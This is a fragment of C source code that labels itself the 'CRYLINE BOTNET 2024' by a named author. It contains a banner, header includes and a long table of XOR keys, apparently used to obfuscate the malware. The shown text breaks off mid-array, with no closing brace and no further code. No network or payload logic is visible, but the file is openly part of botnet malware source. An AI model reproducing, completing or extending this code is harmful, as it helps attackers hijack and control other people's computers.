/* 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;; CRYLINE BOTNET 2024  ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;      by @DarxiS      ;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
*/

#define _GNU_SOURCE

#include <stdint.h>
#include <stdlib.h>

#include "LIBRARIES.h"
#include "VALUES_DATASET.h"
#include "CUSTOM_FUNCTIONS.h"

uint32_t __TABLE_XOR_KEYS[] = 
{
    0x5f137b22, 0x6f5bd7a4, 0x140743c5, 0x715f8801, 0x1b8cc3b2, 0x1d9f78d9, 0x5774faaa, 0x242967dd, 0x315a78e8, 0x8cfe26f, 0x16b3be47, 0x2de766ce, 0x474eb6ee, 0x24348bb4, 0x137b8467, 0x54b243e1, 0x26bf26a9, 0x79d58951, 0x3b0bb3d0, 0x7ec211dd, 0x77713203, 0x2ebb1239, 0x18e2bbc3, 0x6786a489, 0x784106f0, 0x7505512f, 0x1ff5f552, 0x4cf19b8d, 0x45f07ea9, 0x53f5210d, 0x3d40c291, 0x2503f9cb, 0x4350f8b1, 0x51480656, 0x166381cc, 0x5eddbc64, 0x6ee77f30, 0x6dd87c76, 0x3072441, 0x2041f818, 0x76a85ee5, 0x19bae289, 0x4e295ee7, 0x3df715d3, 0x3def6e3d, 0x61a4e34e, 0x12a959b4, 0x64ae94e6, 0x5b7a6ca0, 0x4db50d84, 0x6370a6c4, 0x52eb9ea3, 0x7c701fbd, 0x7c536287, 0x3a72432c, 0x74b126ad, 0x7158b3b6, 0x5a68387f, 0x41a2c23a, 0x3749325f, 0x2e5d598c, 0x7ee384cc, 0x5c4d2c2a, 0x71ae523d, 0x502b8b22, 0x72b0adf6, 0x508c0ea1, 0x3f130a52, 0x60892a6c, 0x539332e3, 0x5f55026b, 0x57318951, 0x6d4e156c, 0x2d7e6152, 0x15289f24, 0x2b3d83a9, 0xf2344a0, 0x27d1f8d8, 0xfec1890, 0x6a9db140, 0x7587065c, 0x735cbf54, 0x3d894fe3, 0x71f72619, 0x6fb021db, 0x77fb9310, 0x66a84cc7, 0x6108d591, 0x5263cb8f, 0x284b0f01, 0x185207f1, 0xc1251b, 0x272e93cd, 0x749f341b, 0x726f7758, 0x775a1ef0, 0x674fe212, 0x42fb85fa, 0x366d2942, 0x47d90c7e, 0x168eb8dd, 0x15c22bad, 0x1f0a95d0, 0x3dcce49, 0x43408cff, 0x343334f4, 0x2f1a51f2, 0x5263d1a0, 0x5c052dcd, 0x3f066a82, 0x3d0182e0, 0x518c3429, 0x326329d6, 0x7a8ad2c4, 0x43835a43, 0x22134bb1, 0x728665d4, 0x2a2ba70a, 0x31c2143, 0x44ea3163, 0x5276b60b, 0x1b6e2934, 0x45ab567e, 0x79a549d9, 0x100d5d4f, 0x381acdd6, 0x70ff68c9, 0x775d3f61, 0x7b1653d0, 0x276c920b, 0x3f364be0, 0x11a50cad, 0x3d2ebdb9, 0x5e40e1b0, 0x1581daf6, 0x6f4ab8, 0x127416a4, 0x449c2ce9, 0x52d31c58, 0x6e794471, 0x3a2976b, 0xfd49f39, 0x4005789b, 0x3605c142, 0xa5f71fd, 0x388d2de, 0x58190cf3, 0x7ce5d7d1, 0x2db479e8, 0x5b352e36, 0x41d00934, 0x2b2ff3, 0x76a3576a, 0x77b5fb2, 0x79d079cc, 0x6b0b4ba, 0x3f962d88, 0x6acfe295, 0x7e0df41b, 0x3aac8159, 0x123c74a1, 0x3d443ffb, 0x4c518e06, 0x4f6b325a, 0x1b8521ab, 0x61d368fd, 0x4fda7d12, 0x2df93850, 0x266f95e6, 0x22ad996b, 0x1c727cc1, 0x2a122d51, 0x328238a4, 0x5c77f55c, 0x6017ee93, 0x3ce1aaa1, 0x6000c83a, 0x3830fb87, 0x39c78272, 0xdb54222, 0x136629bd, 0x7b978ba6, 0xde07216, 0xa098128, 0x312eb58, 0x7b0ebe2, 0x10ba35e2, 0x42a918e0, 0x7280ce78, 0xec829fd, 0x7d559a39, 0x4bd4319, 0x4c0c69f9, 0x49a72840, 0x54287573, 0x67918ba4, 0x2b7a913d, 0x2402f285, 0x158ac3f4, 0x51ea2723, 0x46b08bf0, 0x31fd40b6, 0x7bfc5474, 0x7932c494, 0xe753612, 0x5c144308, 0x36146f35, 0x6e75fe4d, 0x14453e8f, 0x6fdbf1a7, 0x7c2b406f, 0x27ab684c, 0x6b737d4d, 0xa0bb285, 0x31b4e974, 0x6e8668a5, 0x11bc9e68, 0x426f1f56, 0x312f8186, 0x43d6ce0, 0x51374954, 0x2e851bbf, 0x8faaff9, 0x1d43b34d, 0x782c43ff, 0x5d23256c, 0x4d53ef1, 0x23a6d53c, 0x12617f1, 0x1a6002e6, 0x7590fc5f, 0x47d6a3e2, 0x4c5d439c, 0x718d50d4, 0x41096876, 0x5ad279ae, 0x4da193dc, 0x771dd7ac, 0x494877fb, 0x61e6d26b, 0x66f9c953, 0x4573b86b, 0x9923ab7, 0x526d46a1, 0x4f7f6af0, 0x3b47242c, 0x40f3af46, 0x613c0958, 0x7db64382, 0x722330cc, 0x65797638, 0x4eed8cd6, 0x20a84c8c, 0x6e742631, 0x6c314023, 0x18d4908b, 0x4b974b9d, 0x71067f15, 0x3c7b65c8, 0x4cbd638f, 0xb6681fb, 0x320c6227, 0x14940771, 0x57c3c597, 0x2399b2fb, 0x559d6fe7, 0x32963f45, 0x713b46d7, 0x4cbb4793, 0x7bdeb741, 0x53221942, 0x33b510e7, 0x41526fac, 0x5cb453fa, 0x6225788, 0x10d1da9c, 0x17fb7826, 0x471606ce, 0x720de3f5, 0x15b1bba8, 0x3939379b, 0x57875a2d, 0x649f487f, 0x59e18427, 0x45fb805f, 0x50d088a2, 0x72b614b2, 0x1192cbfc, 0x41d707b7, 0x2f317a7a, 0x5e502f8b, 0x4d3d89b2, 0x613ddca2, 0x72e436fc, 0x25014f49, 0x4d78f9d, 0x4881a6e4, 0x57978e8f, 0x7612d675, 0x153cee77, 0x537645d0, 0x4934efb7, 0x48f1ff5e, 0x14c8b57c, 0x25e943b1, 0x4f1456e6, 0x259a9018, 0x3de4bbd7, 0x162a5db5, 0x17a8740d, 0x53967780, 0x4f639550, 0x6f2fce3b, 0x3835bfff, 0x29451977, 0x352b4e9a, 0x90648a1, 0x1bfb2e29, 0x46be1a96, 0x4add5059, 0x4b2ca8a4, 0x250e4a22, 0x181ada0b, 0x2c6a8546, 0x17f2811e, 0x3d1c2955, 0x314214e3, 0x60742802, 0x14b3b7e4, 0x2754eb58, 0x75b1167a, 0x6829fdb4, 0x7089db10, 0x3ea315d8, 0x7cf2b330, 0x16731ec1, 0xdb76cbf, 0x228d4348, 0x5457da99, 0x23e1ca74, 0x3a35b756, 0x27ee5219, 0x73455fc4, 0x29658591, 0x60241218, 0x1c8a793b, 0x5e90d42b, 0x692a5ab9, 0x3885a764, 0x254eeec1, 0x3407ab12, 0x3b25008, 0x4a5d38e3, 0x4c22851e, 0x301cd54e, 0x624fba02, 0x93eae73, 0x615eea32, 0x42c3e204, 0x1df26657, 0x8b3d58a, 0x3874f87e, 0x61c640b, 0x793db09a, 0x77180e57, 0x30f173b, 0xfb0cf5c, 0x4cf7b16, 0x259c5a83, 0x6408a9f5, 0x28b1458a, 0x5fd211d9, 0xbf6fc0e, 0x1bf6a54e, 0x937976a, 0x6c1b0e26, 0x38811e89, 0x67c86b95, 0x554568df, 0x7106c5ed, 0xd175a57, 0x94d13f2, 0x74b915f6, 0x5774933a, 0x556f9910, 0x24d5eb44, 0x39c44d3c, 0x5eae4783, 0x634d576, 0x7c882f41, 0x7ca0adda, 0xee8ab01, 0x34fd27bf, 0x2bd11e5, 0x8265b9b, 0x2c153616, 0x5cc2920, 0x17d72af7, 0x30e4b12c, 0x2b6883a3, 0x7bdfd4ec, 0x5995f6b6, 0xb3a957d, 0x7d6d0fa, 0x758c9c04, 0x14722ce7, 0x73f1df20, 0x2e0dba8d, 0x7c3a987d, 0x49374800, 0x1f14807b, 0x951f2d4, 0x52845bf2, 0x13cd9671, 0x60c6860e, 0x27f3f502, 0x38a381b5, 0x1a8ad34b, 0x6a23c85, 0x3ed8572c, 0x1713028c, 0x342ea5f, 0x4dc1022d, 0x4c102a4b, 0x5fffc44, 0x55e75dc8, 0x78256062, 0xbcc2564, 0x6dbe88c0, 0x290a118e, 0x3734a907, 0x699e5dac, 0x2a00845, 0x426f3e84, 0x71752ea7, 0x782ca449, 0x56e16b6c, 0x65670dc7, 0x263a5ed7, 0x531c03e9, 0x2e9e55c7, 0x454edf52, 0x5c6df6bd, 0x122b1b9, 0x591c75c3, 0x3d347ccb, 0x2916a6bb, 0x11bff778, 0x57bf5016, 0x2fb8e340, 0x50984ea4, 0x6ed252a2, 0x32fbcd9f, 0x1e5950d1, 0x3ae27cee, 0x38fbc9e3, 0x7440ae9a, 0x3307dd50, 0x44c7ef47, 0x61ff375a, 0x5c11eede, 0x7bfc984f, 0x4b9d9506, 0x5eb1f723, 0x3e6bd6d3, 0x3d12c3ad, 0x56de9b6d, 0x154d423f, 0x2279d175, 0x7d18fa44, 0x68694628, 0x5118273c, 0x4267d996, 0x44d73ce5, 0x523ad8f6, 0x1b844f59, 0x20bb9b1, 0x7b517fb1, 0x2d4446d1, 0x59cb09c7, 0x2b0a62f2, 0x7ddc9576, 0x489d5c6a, 0x5e063091, 0x1c35e647, 0x37fd958, 0x1701fa75, 0x107694e1, 0x3687b6a8, 0x5bc9e9bc, 0x7275cc3b, 0x1299a586, 0x57c6820b, 0x3e136142, 0x714b9caa, 0x163258df, 0x7b2624ef, 0x482a3817, 0x2b7f9b1e, 0x1d9ff664, 0x4543325b, 0x13e8e147, 0x6eb81da1, 0x7ab0bf1, 0x58c01e2c, 0x40f2f697, 0x232f5b4a, 0x5acbd7dd, 0x3c447648, 0x5073a21b, 0x3496e1a5, 0x674ed93a, 0x4e503791, 0x7d343e0f, 0x455509cc, 0x6a861dd9, 0xb41767, 0x5c570441, 0x7afcb2ba, 0x373bce0f, 0x3820edfd, 0x6d727ef6, 0x49d57395, 0xfe77009, 0x2b85e038, 0x3b21103f, 0x2619c8e8, 0x26ac0527, 0x34b4856, 0x51996406, 0x444bfb8c, 0x488e7ab1, 0x6582454d, 0x3304192d, 0x503986a2, 0x3e42637a, 0x73f70fc4, 0x7368e1ec, 0x190e3b57, 0x303b860c, 0x43dc8408, 0x4da51cfc, 0x178a5f47, 0x122cbb99, 0x4ad95b0b, 0x5cdf6913, 0x7cb2d972, 0x4b8d7272, 0x39366d54, 0x77af8c2d, 0x2c94081, 0x71575b51, 0x65220b23, 0x4c9eb417, 0x13ecb5a, 0x10a7eb5b, 0x7bfc456, 0x27589442, 0x3753f082, 0xb0b0cad, 0x78f1f849, 0x7b9fec0e, 0x5399875e, 0x5e743d96, 0x2ea4053b, 0x23d30e01, 0x1cb6a110, 0x229b14ff, 0x173befed, 0x35c4dc68, 0x52d69b0c, 0x5b1873f5, 0x369f964, 0x6a60fa53, 0x6d452f8f, 0x4e435470, 0x47406366, 0x69f80901, 0x19d0c6e2, 0x76d0ba, 0x61a7952e, 0x1c9a0764, 0x71ce2c0b, 0x46c9a051, 0x6938bb7b, 0x730cf766, 0x57718bac, 0x70f87fd1, 0x1a658ba8, 0xec57c2f, 0x7c038c7e, 0x135783f1, 0xa65683d, 0x4f9d13dd, 0x71cbc188, 0x39096d79, 0x737021de, 0xe826298, 0x5ba48278, 0xaac11cb, 0x44473f00, 0x2e7b1d84, 0x65c485c1, 0x47b13865, 0x18dc17d7, 0x5309b550, 0x15f48cd5, 0x601c7b3d, 0x3d01be51, 0x2fc553b7, 0x60934bf7, 0x1ea95380, 0x4c5f5b1b, 0x52617803, 0x6572f3d1, 0x35981696, 0x456e6f69, 0x3ce47f7e, 0x26909668, 0x5fd3fb11, 0x4ba9fbad, 0x229422e6, 0x732b7f03, 0x560f63ea, 0x723136c3, 0x64f7408b, 0xf18d163, 0x65a158a1, 0x7379a323, 0x6abd53dc, 0x704d6a6d, 0x37c0e224, 0x19387160, 0x5611f02e, 0x7f721a89, 0x32148938, 0x291ba57e, 0x1566a75e, 0x12310475, 0x661d63cf, 0x452bfb15, 0x72c4506d, 0x4c6b74f, 0x118b5631, 0x4525c870, 0x6a39ab21, 0x47236cc7, 0xa9437d9, 0x271e2a9f, 0x6db4032f, 0x6a6832ea, 0x72c8264c, 0x10482616, 0x5d93b1ed, 0x48d78a36, 0x2795cd9, 0x428af278, 0x57f05b9a, 0x681ab57b, 0x3604959c, 0x42adaf76, 0x58681fe8, 0x6dc577c0, 0x5be620d6, 0x2e7a1016, 0x6d379249, 0xdfaaa0e, 0x5795b594, 0x29e39a7, 0x202bae84, 0x3db31963, 0x47ca34bc, 0x12effef1, 0x4279d0b3, 0x59558aed, 0x5815c761, 0x2cb37bd4, 0x2078f7b5, 0x62a9ff3a, 0x53d1a673, 0xe2cfae4, 0x4d123224, 0x4699ccbf, 0x1e7520fa, 0x2aa5e412, 0xf7156f5, 0x20ee7dd4, 0x6d30d68a, 0x6761b28f, 0x909334f, 0x23356c26, 0x2a0f6205, 0x61715337, 0x10fae3e6, 0x5f582dc, 0xfeb634d, 0x7e32762f, 0x13f02cea, 0x678118e1, 0xd0afd6, 0x341bdb6e, 0x25343244, 0x489ae493, 0x470bda5f, 0x67ae02f7, 0x21f06f80, 0x1f21a1c0, 0x14617ecb, 0x42696735, 0x1cba0fa, 0x6833253e, 0x5096621a, 0x4eddd31f, 0x2eccf1fd, 0x6f0b8314, 0x7983b731, 0x3e3e48f3, 0xffa00e8, 0x66b48dbb, 0x259ffb82, 0x19033437, 0x9e9f9e2, 0x4faf5d88, 0x7a74876e, 0x1ae4ddc8, 0x55a4e064, 0xa5feabb, 0x191753f8, 0x69950d4e, 0x71e1039c, 0x19e803ce, 0x1db0e8bd, 0x171535e1, 0x6282e861, 0x64bcc31c, 0x7ec338d8, 0x47357e2, 0x3de64dd, 0x1324b7a4, 0x46dcbf17, 0x5aa05d7, 0x7b57dce2, 0x17732131, 0x5487d8f6, 0x2a24cee0, 0x67ea446, 0x4e0b9027, 0x686317d3, 0x1678a52e, 0x34c01de3, 0xe031355, 0x2f7bd966, 0x3eaa17c5, 0x5db270dd, 0x29f060d4, 0x598ef58d, 0x33575141, 0x34504b90, 0x72a64985, 0x1cec5e90, 0x26314f2c, 0xc8e4d54, 0x3a9d474d, 0x3d46850d, 0x6f1135b5, 0x1f5a0a69, 0x3c09bde6, 0x73848d97, 0x23386f46, 0x4f2e758a, 0x3a614caf, 0x28e2751e, 0x4a86526c, 0x51d46de0, 0x7d6a4e14, 0x74ab214c, 0x58531226, 0x4b75de3c, 0x5d0e391f, 0x6ecbb755, 0x35fc1f, 0x6b114c75, 0x1e4790bb, 0x3ee013e4, 0x48c3bd52, 0x4837f18f, 0x186f0971, 0x7c1b0e94, 0x7c883d1f, 0xb1552f7, 0x19076d24, 0x22b98c4c, 0x17a3a04b, 0x53a4b471, 0x60001159, 0x6b4d600, 0x72febeda, 0x1c09cf3f, 0x7a396398, 0x16372e21, 0x6b3844c9, 0x349ab047, 0x3f19a33f, 0x35be9736, 0x66f1e27, 0x3c83f153, 0x2a69b882, 0x5ec2304e, 0x7f9cf8f, 0x777f1a2, 0x4d8de7a3, 0x82fcbae, 0x72893e17, 0x6bd5785e, 0x470fdf92, 0x3b4cfb69, 0x340d69ed, 0x5f7ee904, 0x376809fd, 0x3095a70d, 0x6a943bfb, 0x506f7721, 0x534f3359, 0x237dc46, 0x24142b92, 0x334f44b2, 0x8ecb246, 0x1712ea6d, 0x4f5913f2, 0x32615de, 0x2d4a188e, 0x3a9158bb, 0x37c0c625, 0x6c63bbcd, 0x704feff1, 0x3e2fe44d, 0x28e7ad20, 0x1ab9a874, 0x1cf2149b, 0x30e17cb0, 0x22319a16, 0x6a7ffc3e, 0x3911485e, 0x14bad82d, 0x5655749c, 0x2127f1, 0x5007d396, 0xa62de89, 0x5fa010f5, 0x76fdd94, 0x3af88596, 0x4a344cf0, 0x57df54b5, 0xe47b8ef, 0x4c6c2936, 0x7bf38048, 0x4196fda2, 0x5558db7c, 0x13066ab5, 0x10f01194, 0x587ef15b, 0x40508343, 0x4b816a4f, 0x103fb780, 0x2cb43f10, 0x3bd15a41, 0x4e6f9bcd, 0x559bec30, 0x568b02b5, 0x6b61b068, 0x67d68e0, 0x78bc9ccb, 0x55e1aca6, 0x3f8eb13f, 0xd7774f8, 0x2c372142, 0x3fafd930, 0x5d7f488e, 0x3699ffcc, 0x1f4fea25, 0x64ef2622, 0x71928562, 0x69843715, 0x3cce7ad8, 0x7fda3e52, 0x35f0604b, 0x38c1fb20, 0x41713bf4, 0xb493bc7, 0x4bc865d5, 0x52614d88, 0x63c82d22, 0xc18e918, 0x1de2b7d7, 0x7407e4a3, 0x38cd2828, 0x59b41218, 0x42778070, 0xe691458, 0x303f14cd, 0x2dd930d9, 0x14e67d39, 0x28fbb198, 0x3badd7f, 0x54752e78, 0x36732690, 0x2ff1fec2, 0x142507a8, 0x13f26f1f, 0x668bfe8e, 0x3374f1cd, 0x78e19541, 0x581e83f0, 0x1cf928e2, 0x35b01019, 0x57f8c242, 0x52e9892d, 0x6e720b39, 0x1969fe36, 0x5e32c4f4, 0x3a3a710e, 0x6bcb4bbe, 0x41faf217, 0x46535a26, 0x9ae0396, 0x3602d6ba, 0x7f20824e, 0x636215ae, 0x787a572a, 0xd8996a7, 0x13a12a7c, 0x26538803, 0x227013e0, 0x3c9cdc14, 0x2a0e6583, 0x76e54258, 0x731002a5, 0x5a006445, 0xb0a4a00, 0x70271c4, 0x408c62d3, 0x3e7f3bcd, 0x7fe40705, 0x18aae6c3, 0x5b7864af, 0x3594171f, 0x70a3a906, 0x2e61eddc, 0x24062258, 0xa0da73c, 0xc94b2d0, 0x5e409367, 0x75d8f2fb, 0x4e8fa4e7, 0x2493ed8d, 0x7f86f691, 0x4927ba1, 0x23b46fdc, 0x62e90c3f, 0x7d0cd2cc, 0x313e0683, 0x768a36bb, 0x23605acf, 0x53ae1a63, 0x332712d0, 0x4d6ec052, 0x4a935cbb, 0x26371575, 0x276f2497, 0x559da6bb, 0x2d398739, 0x67fb876a, 0x141ce288, 0x2d1d8e3e, 0xa66e2e, 0x6f954737, 0x62b1a55d, 0x714a1734, 0x1df73513, 0x6b7c7b6, 0x7b57be70, 0x2a8be7e3, 0x64f85b1d, 0x7130b16b, 0x791b8ccb, 0x98c48aa, 0x70b7a7fc, 0x7dae086c, 0x2d40b886, 0x53a0b43c, 0x7abadb38, 0x5e7ebf09, 0x4a2aeaf7, 0x1e1b3608, 0x322cd96c, 0x7d51fdc7, 0x6b89f65a, 0x7cc03627, 0x2389133c, 0x12f91af2, 0x525ddce2, 0x50c29a75, 0x7af4a25c, 0x667abf6a, 0x7de028b4, 0x7b9b108a, 0x561006a1, 0x6091ce11, 0x6ce527be, 0x74073bb4, 0x674995c7, 0x683ce62f, 0x1e932398, 0x4c41f0e4, 0x596d979a, 0x17aeb063, 0x55ce398f, 0x4a253f97, 0x155cb8cf, 0x30ef215, 0x1dc5f3d3, 0x10179408, 0x618db11f, 0x67f0deca, 0x2e32ca10, 0x13ba8a8b, 0x6542dc92, 0x19bcc06a, 0x107ac0b3, 0x8cbefce, 0x2cb5db5c, 0x62d89d95, 0x598e8a44, 0x27aa7db9, 0x49535d00, 0x576eb2f8, 0x23458e43, 0x1f6363a1, 0x38008109, 0x102ab602, 0x136a9f56, 0x1f4a16d1, 0x78679c31, 0x31fdc2ee, 0x6b8c07b5, 0x51d533cb, 0x49ac7351, 0x415a4144, 0x1bfa7362, 0x5f092c20, 0x4469335a, 0x39c06735, 0x6f20c028, 0x25f6e479, 0x21b14600, 0x1d538a38, 0x39b16f04, 0x6f42292, 0x37104aa3, 0x4a2c2fb7, 0xfc01260, 0x63c625ff, 0x2d04cd4d, 0x694e9ca4, 0xb70a3b8, 0x76582a4d, 0x40bd4f9c, 0x2eb631fc, 0x15bb8dee, 0x78bdd0a6, 0x3ee0e7fe, 0x29262d44, 0x1807e777, 0x3748842f, 0x5b23f032, 0x393ef2c, 0x91db7fa, 0x24d06383, 0x44ee3071, 0x25182b5d, 0x3d98fa4, 0x95763cb, 0x5ed89292, 0x72fa4fcc, 0x2f4e4844, 0x89d892, 0x104dda05, 0x68ffb748, 0x77dfb24, 0x475e24a8, 0x332be700, 0x173e0d85, 0x2b244aa7, 0x6030b44d, 0x8caa29, 0x3694ee60, 0x5688de9a, 0x4149f9c6, 0x654b205c, 0x6c446c88, 0x3a07ca6c, 0x242c085a, 0x156a99cd, 0x520fb1e3, 0x5b748c89, 0x708e89ff, 0x55a3a10f, 0x64924483, 0x155eed83, 0x1a91d180, 0x9aa6fe0, 0x19387d27, 0x23e9354b, 0x68830273, 0xc32ccf3, 0x53377d8f, 0x690cdb05, 0x1c80a6f8, 0x3c3734d8, 0x708ad62a, 0x63decba0, 0x6f631bd8, 0x7c8e3af, 0xf031648, 0x4f93d025, 0x8558dd8, 0x459804a8, 0x261caebf, 0x499f879e, 0x2ae32504, 0x12611b47, 0x3a7520a, 0x4f0f2d5e, 0x27cbb514, 0x55b703ed, 0x2a83b9e7, 0x185a3f14, 0x2b5aa4fd, 0xf15fe6a, 0x2db92c97, 0x45ec767d, 0x18c06e4b, 0x46f1a9be, 0x69d5abc9, 0x14370be, 0x532476b1, 0x3d0d2958, 0x6a504bc3, 0x6fa51daa, 0x79445e30, 0x5adb21ed, 0x5383e94a, 0x68a77a08, 0x62a4059c, 0x6286ff92, 0x383b4a2d, 0x6af99375, 0x281f043a, 0x5e57f8ec, 0x34991b13, 0x5302293e, 0x70b91434, 0x38406d1e, 0x2211569c, 0x1884c948, 0xdf7710b, 0x4c951083, 0x30df085c, 0x39521608, 0x5bab0eee, 0x5e9834f3, 0x7f3e8c86, 0x746b7d39, 0x2589deb1, 0x6914384f, 0x75aeedf7, 0x78ae5563, 0x262161a7, 0x5fff39ba, 0x6853730d, 0x1f65bfd8, 0x3ada5ba8, 0x3bd75c57, 0x80d39e0, 0x1d7e6144, 0x1e5e5bea, 0x4048840e, 0x877f4b9, 0x467d6024, 0x1ea07cfa, 0x3d110fcd, 0x197f8963, 0xf59912e, 0x75517ceb, 0x3b90dfff, 0x27de5a77, 0x348edf6, 0x825f083, 0x58bd62d3, 0x3c9b03ff, 0x63d0ff71, 0x375597c7, 0x3bd99085, 0x583c7caa, 0x5cdf7678, 0x24edc8d4, 0x4deb6aa1, 0x558dcbdb, 0x4b0f2a7b, 0x2deaa45b, 0x3de13ee8, 0x6a74ea53, 0x68c50003, 0x79b89b40, 0x72822434, 0x6436148, 0x1816f72a, 0x32caa842, 0xebb5601, 0x5e94574e, 0x516b253c, 0x4bcc65ce, 0x7813e0b1, 0x60c4b66b, 0x411de2b9, 0x33a4c0b1, 0x8a310e2, 0x4466d0b0, 0x3bcab134, 0x616073b5, 0x101d4af, 0x1f9bb0a5, 0x18b60b7c, 0x3cdb6534, 0x77d82d4f, 0x759581f5, 0x61c92e08, 0x45c397f0, 0x4b234dd0, 0x2cd85883, 0x73ae3c4b, 0x9048cb9, 0x174d42d7, 0x5c733c4f, 0x2bd27f9, 0x9cf670b, 0x62b69d97, 0x1ad41f23, 0x3c9a0f4d, 0x7171f398, 0x79687671, 0xe053489, 0x3d3e5967, 0x717c5723, 0x6ec9eaf4, 0x7e5c3c20, 0x252117d4, 0x776cfbd6, 0x42c30cd0, 0x60ebc908, 0x58cd6f8c, 0x43c4e17f, 0x8779ad, 0x71837b08, 0xa046b3, 0x785fa6fc, 0x6718fcfd, 0x626974bb, 0x3e233eec, 0x323c4ace, 0xf41cd3f, 0x31d17b37, 0x3b40d787, 0x268f1016, 0xe44b786, 0x3dfdff80, 0x305e7721, 0x70fb551d, 0x58d21ea3, 0x6cf8866e, 0x626d48b6, 0x523a9514, 0x7afdbaf7, 0x1faba21d, 0x43b6ec37, 0x69c7a5ec, 0x1e07de3d, 0x68d8040b, 0x6134a1c2, 0x60caeb0e, 0x49c3cd13, 0x3a02114e, 0x248fcc8d, 0x4a4b46c0, 0x2b858c57, 0x25301341, 0x42aaedbc, 0x129e8954, 0x79987fc, 0xce2ca8, 0x44dad422, 0x16db553b, 0x329fa7e0, 0x1baba9, 0x3d6a6551, 0x40e45f66, 0x3e19ab29, 0x6dc8dc72, 0x31dfb484, 0x16ebc9cc, 0x5ac162e0, 0x144cfd3a, 0x69265ee1, 0x55bf1dd8, 0x33f89f57, 0x2cdd4b18, 0x3f86c3c4, 0x52007d94, 0x15b54f24, 0x20bb6586, 0x32cb68a2, 0x5f791c37, 0x5abd76d5, 0x575b3530, 0x29c462f8, 0x643032c, 0x7c8b4871, 0x6c6f50b4, 0x18e18c80, 0x424d06d, 0x6d3d7d5d, 0x5dbc60a3, 0x1b0025a9, 0x1fdd253d, 0x5dd80c4c, 0x586a8afa, 0x60c184a3, 0x1bf1b776, 0x4633676d, 0x12a13927, 0x32dd8142, 0x20f4ca4d, 0x26ee3661, 0x1c03e023, 0x76b3e825, 0x5ae6d5b8, 0x48e12b3c, 0x363aabe9, 0x2ce7534d, 0x5e967a60, 0x56f61170, 0x5fb2bbef, 0x3e0f9697, 0x31b38845, 0x370df11f, 0x67d3f98f, 0x37f68b71, 0x33993990, 0x54434a44, 0x50d817f1, 0x37be09fe, 0x4180c7a1, 0x2e947894, 0x52be2fa7, 0x615decde, 0xc6c84e1, 0x2b28baa1, 0x421f7181, 0x285e3c57, 0x715c220e, 0x54c0aaa9, 0x5b3bbd99, 0x1250ec5c, 0x7baee10a, 0x773f9dbd, 0x904d481, 0x5695b6c3, 0x4020c8f9, 0x3f3f806b, 0x37d0a10, 0x1eb74359, 0x163591db, 0x632fc5ff, 0x5cc6d9f0, 0x47e91a20, 0x1a3db71f, 0x449ad380, 0x7fdfa591, 0x4dd6f0af, 0x18de1dc4, 0x50b7bd82, 0x594faad, 0x5a5ee565, 0x7f4c3617, 0x58532a54, 0x3bbcd243, 0xbb8baf8, 0x37be4f6, 0x7ddc43c4, 0x3416f74f, 0x74d80704, 0x529cee6d, 0xf52b4e8, 0x728f360, 0x4e4bcf78, 0x69252a5, 0x102dc7e2, 0x24e1863b, 0x46b31b9e, 0x4f6d484d, 0x285e904b, 0x656a5ef7, 0x65a2da28, 0xb8e564a, 0x423138e8, 0x2d8bf448, 0x25cc0d69, 0x6cc0c68, 0x2d6b99d9, 0x73a2fe19, 0x1faa2a2c, 0x7e23575b, 0x7937f8c6, 0x7a090f91, 0x7d6f8d72, 0x518b231b, 0x35c5e1d4, 0x928486a, 0x55070811, 0x33a22598, 0x3d3f3fb9, 0x49df0f15, 0x63f1406, 0x4c91f4a2, 0x51080276, 0x548ae37e, 0x53244747, 0x6135ca58, 0x796c69b9, 0x19d762e6, 0x30a312a5, 0x21cafa04, 0x7f41c1dd, 0x1645eccd, 0x2d59504e, 0x4172fac5, 0x43d1e115, 0x53255db8, 0x483f072d, 0x713d7aee, 0x46c85bd1, 0x67e93159, 0x6f60d249, 0x40005497, 0x61f240ea, 0x6cd05fbc, 0x118b77b2, 0x17b822be, 0x75f8a826, 0x66927fc3, 0x4b5a4857, 0x3337e7e0, 0x30718ed9, 0x51995c5d, 0x7fc9dc82, 0x179914f, 0x26243fdb, 0x52ee23c9, 0x62af5ba7, 0x1f90a994, 0x6cc586af, 0x13526e4c, 0x415ba398, 0x6c07488d, 0x29985b19, 0x6eb4f3e6, 0x2d7a4352, 0x6d6a3c2e, 0x41da519e, 0x75b94a80, 0x5ea7b71c, 0x8a2ad6f, 0x5da27bd9, 0x4e088965, 0x48a30207, 0x3f94bcc4, 0x3ad8e921, 0x5a2e79b9, 0x574cdf82, 0x30d19148, 0x40c0f97d, 0x22a727d9, 0x64097928, 0x71328856, 0x74408436, 0x63d355aa, 0x72ac19a5, 0x1a64c411, 0x36c17973, 0x555b754c, 0x39f56da5, 0x23870023, 0x68ade398, 0x7b51113d, 0xf8e48b0, 0x12463eb1, 0x6a060524, 0x3d088c02, 0x7fb07adf, 0x2be056c2, 0x32c1d682, 0x5e5831fb, 0x34830432, 0x1064525c, 0x2c60bb60, 0x7d260639, 0x4ff90f20, 0x6739a482, 0x57547ff2, 0x2745eea2, 0x180b35ca, 0x1815796f, 0x49ed167c, 0x7c14aef2, 0x94801c5, 0x3e2d9ab2, 0x5fe8049c, 0x7bf41b6a, 0x58925ec4, 0x16a97e0f, 0x514f90b6, 0x1287cc69, 0x3a307e32, 0x39fd744e, 0xdd8dda7, 0x49bec6e2, 0x4c43b2ff, 0x77dee2cb, 0x6c752e5, 0x4bf42dde, 0x23bf398d, 0x39892967, 0x2a4c5fd9, 0x58423dbf, 0x49ed7bc3, 0x56ad1b3a, 0x556843f8, 0x19e68ae3, 0x3de6bfbc, 0x2cbcc3eb, 0x412c7986, 0x55f1f586, 0x44d23d5a, 0xb199002, 0x5206a478, 0x4e1a3f20, 0x49472ab4, 0x31eea914, 0x4a0e5a8a, 0x21d98978, 0x48982723, 0x1b5deb41, 0x346155e2, 0x2c8a556, 0x555b5f8f, 0x423a3389, 0x4c876c38, 0x219f128f, 0x3a191654, 0x534ebf1d, 0x6d93406d, 0x5dd84fe1, 0xcd7e885, 0x17dfa047, 0x361a8da1, 0x56c56448, 0x6e8cbb81, 0xb82d199, 0x70abef2c, 0x2c737b3d, 0x383f9584, 0x31d868b2, 0x26570c3, 0x7d11d2df, 0x3cf1f8b4, 0x546c153b, 0x4b2c11ff, 0x6392368, 0x65abe4f, 0x153a6c89, 0x2812ace1, 